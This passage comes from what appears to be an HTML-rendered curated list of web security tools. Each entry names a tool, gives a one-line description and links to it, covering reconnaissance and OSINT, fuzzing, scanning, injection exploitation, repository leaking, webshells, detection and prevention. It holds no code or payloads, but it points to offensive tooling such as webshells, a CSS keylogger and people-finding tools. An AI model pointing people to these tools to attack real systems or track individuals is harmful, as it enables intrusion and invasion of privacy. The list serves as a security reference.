data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oZWlwZWk=\">@heipei</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv\">ZoomEye</span> - ZoomEye 是一个针对网络空间的搜索引擎 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS96b29tZXllX3RlYW0=\">@zoomeye_team</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb2ZhLnNvLw==\">FOFA</span> - 网络空间资产搜索引擎 by <span class=\"exturl\" data-url=\"aHR0cDovL2JhaW1hb2h1aS5uZXQv\">白帽汇</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9udGkubnNmb2N1cy5jb20v\">NSFOCUS</span> - THREAT INTELLIGENCE PORTAL by NSFOCUS GLOBAL.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9QaG90b24=\">Photon</span> - Incredibly fast crawler designed for OSINT by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3NoYWRhbi5jb20v\">傻蛋联网设备搜索</span> - 监测互联网基础设施安全威胁 by <span class=\"exturl\" data-url=\"aHR0cDovL3dlaWJvLmNvbS9zaGFkYW5zb3U=\">@傻蛋搜索</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VsZXZlblBhdGhzL0ZPQ0E=\">FOCA</span> - FOCA (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZWxldmVucGF0aHMuY29tL2luZGV4Lmh0bWw=\">ElevenPaths</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcGlkZXJmb290Lm5ldC8=\">SpiderFoot</span> - Open source footprinting and intelligence-gathering tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9iaW5hcnlwb29s\">@binarypool</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxzb2NrZXQveHJheQ==\">xray</span> - XRay is a tool for recon, mapping and OSINT gathering from public networks by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxzb2NrZXQ=\">@evilsocket</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbi9HaXRyb2I=\">gitrob</span> - Reconnaissance tool for GitHub organizations by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbg==\">@michenriksen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0ZlZWlDTi9HU0lM\">GSIL</span> - Github Sensitive Information Leakage（Github 敏感信息泄露）by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0ZlZWlDTg==\">@FeeiCN</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4MDlBTC9yYXZlbg==\">raven</span> - raven is a Linkedin information gathering tool that can be used by pentesters to gather information about an organization employees using Linkedin by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4MDlBTA==\">@0x09AL</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9SZWNvbkRvZw==\">ReconDog</span> - Reconnaissance Swiss Army Knife by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFydC5tZS9wL1FSRU5uTy9kYXRhYmFzZXM=\">Databases - start.me</span> - Various databases which you can use for your OSINT research by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS90ZWNobmlzZXR0ZQ==\">@technisette</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW9wbGVmaW5kdGhvci5kay8=\">peoplefindThor</span> - the easy way to find people on Facebook by [postkassen](<span class=\"exturl\" data-url=\"bWFpbHRvOnBvc3RrYXNzZW5Ab2VqdmluZC5kaw==\">mailto:postkassen@oejvind.dk</span>?<span class=\"exturl\" data-url=\"aHR0cDovL3N1YmplY3Q9cGVvcGxlZmluZHRob3IuZGs=\">subject=peoplefindthor.dk</span> comments).</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZhZ3VpbGVyYWRpYXovdGluZm9sZWFr\">tinfoleak</span> - The most complete open-source tool for Twitter intelligence analysis by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZhZ3VpbGVyYWRpYXo=\">@vaguileradiaz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2eWF0YXJtZWdlZC9SYWNjb29u\">Raccoon</span> - High performance offensive security tool for reconnaissance and vulnerability scanning by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2eWF0YXJtZWdlZA==\">@evyatarmeged</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NwaWRlckxhYnMvc29jaWFsX21hcHBlcg==\">Social Mapper</span> - Social Media Enumeration &amp; Correlation Tool by Jacob Wilkin(Greenwolf) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NwaWRlckxhYnM=\">@SpiderLabs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VzcGkwbi9Eb2NrZXJmaWxlcw==\">espi0n/Dockerfiles</span> - Dockerfiles for various OSINT tools by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VzcGkwbg==\">@espi0n</span>.</li>\n</ul>\n<p><a name=\"tools-sub-domain-enumeration\"></a></p>\n<h4 id=\"sub-domain-enumeration-2\"><a class=\"anchor\" href=\"#sub-domain-enumeration-2\">#</a> Sub Domain Enumeration</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzcg==\">Sublist3r</span> - Sublist3r is a multi-threaded sub-domain enumeration tool for penetration testers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xh\">@aboul3la</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NocmlzVHJ1bmNlci9FeWVXaXRuZXNz\">EyeWitness</span> - EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NocmlzVHJ1bmNlcg==\">@ChrisTruncer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==\">subDomainsBrute</span> - A simple and fast sub domain brute tool for pentesters by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpamllamll\">@lijiejie</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbi9hcXVhdG9uZQ==\">AQUATONE</span> - Tool for Domain Flyovers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbg==\">@michenriksen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VsZHJhY28vZG9tYWluX2FuYWx5emVy\">domain_analyzer</span> - Analyze the security of any domain by finding all the information possible by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VsZHJhY28=\">@eldraco</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZW4vZG9jdW1lbnRhdGlvbi9zZWFyY2hpbmcvI2dldHRpbmctZG9tYWluLWluZm9ybWF0aW9u\">VirusTotal domain information</span> - Searching for domain information by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20v\">VirusTotal</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9jZXJ0aWZpY2F0ZS10cmFuc3BhcmVuY3k=\">Certificate Transparency</span> - Google's Certificate Transparency project fixes several structural flaws in the SSL certificate system by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZQ==\">@google</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcnQuc2gv\">Certificate Search</span> - Enter an Identity (Domain Name, Organization Name, etc), a Certificate Fingerprint (SHA-1 or SHA-256) or a <span class=\"exturl\" data-url=\"aHR0cDovL2NydC5zaA==\">crt.sh</span> ID to search certificate(s) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NydHNo\">@crtsh</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dlNXRlci9HU0RG\">GSDF</span> - Domain searcher named GoogleSSLdomainFinder by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dlNXRlcg==\">@We5ter</span>.</li>\n</ul>\n<p><a name=\"tools-code-generating\"></a></p>\n<h3 id=\"code-generating\"><a class=\"anchor\" href=\"#code-generating\">#</a> Code Generating</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ni9WV0dlbg==\">VWGen</span> - Vulnerable Web applications Generator by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">@qazbnm456</span>.</li>\n</ul>\n<p><a name=\"tools-fuzzing\"></a></p>\n<h3 id=\"fuzzing\"><a class=\"anchor\" href=\"#fuzzing\">#</a> Fuzzing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3htZW5kZXovd2Z1eno=\">wfuzz</span> - Web application bruteforcer by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3htZW5kZXo=\">@xmendez</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhY2stYWxsLXRoZS10aGluZ3MvY2hhcnNldGluc3BlY3Q=\">charsetinspect</span> - Script that inspects multi-byte character sets looking for characters with specific user-defined properties by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhY2stYWxsLXRoZS10aGluZ3M=\">@hack-all-the-things</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09zYW5kYU1hbGl0aC9JUE9iZnVzY2F0b3I=\">IPObfuscator</span> - Simple tool to convert the IP to a DWORD IP by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09zYW5kYU1hbGl0aA==\">@OsandaMalith</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9kb21hdG8=\">domato</span> - DOM fuzzer by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZQ==\">@google</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Z1enpkYi1wcm9qZWN0L2Z1enpkYg==\">FuzzDB</span> - Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05la21vL2Rpcmh1bnQ=\">dirhunt</span> - Web crawler optimized for searching and analyzing the directory structure of a site by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05la21v\">@nekmo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3NsbGFicy5jb20vc3NsdGVzdC8=\">ssltest</span> - Online service that performs a deep analysis of the configuration of any SSL web server on the public internet. Provided by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3NsbGFicy5jb20=\">Qualys SSL Labs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0JvMG9NL2Z1enoudHh0\">fuzz.txt</span> - Potentially dangerous files by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0JvMG9N\">@Bo0oM</span>.</li>\n</ul>\n<p><a name=\"tools-scanning\"></a></p>\n<h3 id=\"scanning\"><a class=\"anchor\" href=\"#scanning\">#</a> Scanning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dwc2NhbnRlYW0vd3BzY2Fu\">wpscan</span> - WPScan is a black box WordPress vulnerability scanner by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dwc2NhbnRlYW0=\">@wpscanteam</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyZWdvODUvSm9vbWxhU2Nhbg==\">JoomlaScan</span> - Free software to find the components installed in Joomla CMS, built out of the ashes of Joomscan by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyZWdvODU=\">@drego85</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL200bGwway9XQVNjYW4=\">WAScan</span> - Is an open source web application security scanner that uses &quot;black-box&quot; method, created by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL200bGwwaw==\">@m4ll0k</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVp\">Nuclei</span> - Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3Zlcnk=\">@projectdiscovery</span>.</li>\n</ul>\n<p><a name=\"tools-penetration-testing\"></a></p>\n<h3 id=\"penetration-testing\"><a class=\"anchor\" href=\"#penetration-testing\">#</a> Penetration Testing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYnVycC8=\">Burp Suite</span> - Burp Suite is an integrated platform for performing security testing of web applications by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RoZUluZmVjdGVkRHJha2UvVElEb1MtRnJhbWV3b3Jr\">TIDoS-Framework</span> - A comprehensive web application audit framework to cover up everything from Reconnaissance and OSINT to Vulnerability Analysis by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RoZUluZmVjdGVkRHJha2U=\">@_tID</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZsaXBrYXJ0LWluY3ViYXRvci9hc3RyYQ==\">Astra</span> - Automated Security Testing For REST API's by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZsaXBrYXJ0LWluY3ViYXRvcg==\">@flipkart-incubator</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhZ3J6L2F3c19wd24=\">aws_pwn</span> - A collection of AWS penetration testing junk by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhZ3J6\">@dagrz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWNrZXRzLmdyYXloYXR3YXJmYXJlLmNvbS8=\">grayhatwarfare</span> - Public buckets by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ncmF5aGF0d2FyZmFyZS5jb20v\">grayhatwarfare</span>.</li>\n</ul>\n<p><a name=\"tools-offensive\"></a></p>\n<h3 id=\"offensive\"><a class=\"anchor\" href=\"#offensive\">#</a> Offensive</h3>\n<p><a name=\"tools-xss\"></a></p>\n<h4 id=\"xss-cross-site-scripting-2\"><a class=\"anchor\" href=\"#xss-cross-site-scripting-2\">#</a> XSS - Cross-Site Scripting</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JlZWZwcm9qZWN0L2JlZWY=\">beef</span> - The Browser Exploitation Framework Project by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZWVmcHJvamVjdC5jb20=\">beefproject</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9KU2hlbGw=\">JShell</span> - Get a JavaScript shell with XSS by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==\">XSStrike</span> - XSStrike is a program which can fuzz and bruteforce parameters for XSS. It can also detect and bypass WAFs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxjb3MveHNzb3Iy\">xssor2</span> - XSS'OR - Hack with JavaScript by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxjb3M=\">@evilcos</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3Blci5pby9ldmFsdWF0b3I=\">csp evaluator</span> - A tool for evaluating content-security-policies by <span class=\"exturl\" data-url=\"aHR0cDovL2NzcGVyLmlv\">Csper</span>.</li>\n</ul>\n<p><a name=\"tools-sql-injection\"></a></p>\n<h4 id=\"sql-injection-3\"><a class=\"anchor\" href=\"#sql-injection-3\">#</a> SQL Injection</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">sqlmap</span> - Automatic SQL injection and database takeover tool.</li>\n</ul>\n<p><a name=\"tools-template-injection\"></a></p>\n<h4 id=\"template-injection\"><a class=\"anchor\" href=\"#template-injection\">#</a> Template Injection</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS90cGxtYXA=\">tplmap</span> - Code and Server-Side Template Injection Detection and Exploitation Tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYQ==\">@epinna</span>.</li>\n</ul>\n<p><a name=\"tools-xxe\"></a></p>\n<h4 id=\"xxe-3\"><a class=\"anchor\" href=\"#xxe-3\">#</a> XXE</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dvU2VjdXJlL2R0ZC1maW5kZXI=\">dtd-finder</span> - List DTDs and generate XXE payloads using those local DTDs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dvU2VjdXJl\">@GoSecure</span>.</li>\n</ul>\n<p><a name=\"tools-csrf\"></a></p>\n<h4 id=\"cross-site-request-forgery\"><a class=\"anchor\" href=\"#cross-site-request-forgery\">#</a> Cross Site Request Forgery</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4SW5mZWN0aW9uL1hTUkZQcm9iZQ==\">XSRFProbe</span> - The Prime CSRF Audit &amp; Exploitation Toolkit by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4aW5mZWN0aW9u\">@0xInfection</span>.</li>\n</ul>\n<p><a name=\"tools-ssrf\"></a></p>\n<h4 id=\"server-side-request-forgery\"><a class=\"anchor\" href=\"#server-side-request-forgery\">#</a> Server-Side Request Forgery</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pbnRpZ3JpdGkuaW8vcmVkaXJlY3Rvci8=\">Open redirect/SSRF payload generator</span> - Open redirect/SSRF payload generator by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW50aWdyaXRpLmNvbS8=\">intigriti</span>.</li>\n</ul>\n<p><a name=\"tools-leaking\"></a></p>\n<h3 id=\"leaking\"><a class=\"anchor\" href=\"#leaking\">#</a> Leaking</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9IVFRQTGVha3M=\">HTTPLeaks</span> - All possible ways, a website can leak HTTP requests by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1Mw==\">@cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvc3QvZHZjcy1yaXBwZXI=\">dvcs-ripper</span> - Rip web accessible (distributed) version control systems: SVN/GIT/HG... by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tvc3Q=\">@kost</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxwYWNrZXQvRFZDUy1QaWxsYWdl\">DVCS-Pillage</span> - Pillage web accessible GIT, HG and BZR repositories by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxwYWNrZXQ=\">@evilpacket</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Vua0w0Yi9HaXRNaW5lcg==\">GitMiner</span> - Tool for advanced mining for content on Github by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Vua0w0Yg==\">@UnkL4b</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3pyaWNldGhlemF2L2dpdGxlYWtz\">gitleaks</span> - Searches full repo history for secrets and keys by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3pyaWNldGhlemF2\">@zricethezav</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21heGNoZWhhYi9DU1MtS2V5bG9nZ2luZw==\">CSS-Keylogging</span> - Chrome extension and Express server that exploits keylogging abilities of CSS by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21heGNoZWhhYg==\">@maxchehab</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsbHlzaGthL3B3bmdpdG1hbmFnZXI=\">pwngitmanager</span> - Git manager for pentesters by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsbHlzaGth\">@allyshka</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhbm5vYi9zbmFsbHlnYXN0ZXI=\">snallygaster</span> - Tool to scan for secret files on HTTP servers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhbm5vYg==\">@hannob</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dlcmJlbkphdmFkby9MaW5rRmluZGVy\">LinkFinder</span> - Python script that finds endpoints in JavaScript files by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dlcmJlbkphdmFkbw==\">@GerbenJavado</span>.</li>\n</ul>\n<p><a name=\"tools-detecting\"></a></p>\n<h3 id=\"detecting\"><a class=\"anchor\" href=\"#detecting\">#</a> Detecting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcWxjaG9wLmNoYWl0aW4uY24v\">sqlchop</span> - SQL injection detection engine by <span class=\"exturl\" data-url=\"aHR0cDovL2NoYWl0aW4uY29t\">chaitin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3NjaG9wLmNoYWl0aW4uY24v\">xsschop</span> - XSS detection engine by <span class=\"exturl\" data-url=\"aHR0cDovL2NoYWl0aW4uY29t\">chaitin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JldGlyZUpTL3JldGlyZS5qcw==\">retire.js</span> - Scanner detecting the use of JavaScript libraries with known vulnerabilities by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JldGlyZUpT\">@RetireJS</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0h5bmVrUGV0cmFrL21hbHdhcmUtamFpbA==\">malware-jail</span> - Sandbox for semi-automatic Javascript malware analysis, deobfuscation and payload extraction by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0h5bmVrUGV0cmFr\">@HynekPetrak</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2F1dGgwL3JlcG8tc3VwZXJ2aXNvcg==\">repo-supervisor</span> - Scan your code for security misconfiguration, search for passwords and secrets.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xld2lzQXJkZXJuL2JYU1M=\">bXSS</span> - bXSS is a simple Blind XSS application adapted from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlNTMuZGUvbQ==\">cure53.de/m</span> by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xld2lzQXJkZXJu\">@LewisArdern</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzBkYXkud2Vic2Fhcy5jb20uY24v\">重大漏洞在线检测系统</span> - 重大漏洞在线检测系统 by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kYmFwcHNlY3VyaXR5LmNvbS5jbi8=\">杭州安恒信息技术有限公司</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FwcHMvZ3VhcmRyYWlscw==\">GuardRails</span> - A GitHub App that provides security feedback in Pull Requests.</li>\n</ul>\n<p><a name=\"tools-preventing\"></a></p>\n<h3 id=\"preventing\"><a class=\"anchor\" href=\"#preventing\">#</a> Preventing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9ET01QdXJpZnk=\">DOMPurify</span> - DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlNTMuZGUv\">Cure53</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlaXpvbmdtaW4vanMteHNz\">js-xss</span> - Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlaXpvbmdtaW4=\">@leizongmin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nvc3NhY2tsYWJzL2FjcmE=\">Acra</span> - Client-side encryption engine for SQL databases, with strong selective encryption, SQL injections prevention and intrusion detection by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29zc2Fja2xhYnMuY29tLw==\">@cossacklabs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3Blci5pbw==\">Csper</span> - A set of tools for building/evaluating/monitoring content-security-policy to prevent/detect cross site scripting by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3Blci5pbw==\">Csper</span>.</li>\n</ul>\n<p><a name=\"tools-proxy\"></a></p>\n<h3 id=\"proxy\"><a class=\"anchor\" href=\"#proxy\">#</a> Proxy</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2hhcmxlc3Byb3h5LmNvbS8=\">Charles</span> - HTTP proxy / HTTP monitor / Reverse Proxy that enables a developer to view all of the HTTP and SSL / HTTPS traffic between their machine and the Internet.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pdG1wcm94eS9taXRtcHJveHk=\">mitmproxy</span> - Interactive TLS-capable intercepting HTTP proxy for penetration testers and software developers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pdG1wcm94eQ==\">@mitmproxy</span>.</li>\n</ul>\n<p><a name=\"tools-webshell\"></a></p>\n<h3 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> Webshell</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9uYW5v\">nano</span> - Family of code golfed PHP shells by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlbm5jL3dlYnNoZWxs\">webshell</span> - This is a webshell open source project by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlbm5j\">@tennc</span>.</li>\n<li><span class=\"exturl\" 